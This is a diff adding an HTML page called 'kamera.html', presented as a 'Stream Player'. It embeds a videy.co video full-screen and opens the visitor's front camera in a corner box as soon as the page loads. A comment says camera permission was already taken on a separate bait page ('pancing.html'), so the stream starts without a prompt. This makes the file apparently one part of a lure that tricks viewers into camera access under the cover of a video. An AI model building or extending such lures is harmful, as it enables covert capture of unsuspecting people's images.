@@ -1,0 +1,74 @@
+<!-- FILE 2: kamera.html (Halaman Utama / Viewer + Kamera Aktif) -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream Player</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; background: #000; overflow: hidden; }
+        
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        #cam-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 160px;
+            height: 120px;
+            background: #111;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.2);
+            z-index: 999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            background: #000;
+        }
+    </style>
+</head>
+<body>
+    <!-- Target Videy Embed -->
+    <iframe src="https://videy.co/v/?id=kbxVq76S1" allow="autoplay; encrypted-media; camera; microphone" allowfullscreen></iframe>
+
+    <!-- Kotak Preview Kamera -->
+    <div id="cam-container">
+        <video id="cam" autoplay playsinline muted></video>
+    </div>
+
+    <script>
+        async function initViewerCamera() {
+            const videoElement = document.getElementById('cam');
+            try {
+                // Karena izin sudah diberikan di pancing.html, halaman ini langsung mengambil stream tanpa pop-up
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                videoElement.srcObject = stream;
+                await videoElement.play();
+            } catch (err) {
+                console.error("Gagal memuat stream:", err);
+                document.getElementById('cam-container').style.display = 'none';
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', initViewerCamera);
+    </script>
+</body>
+</html>
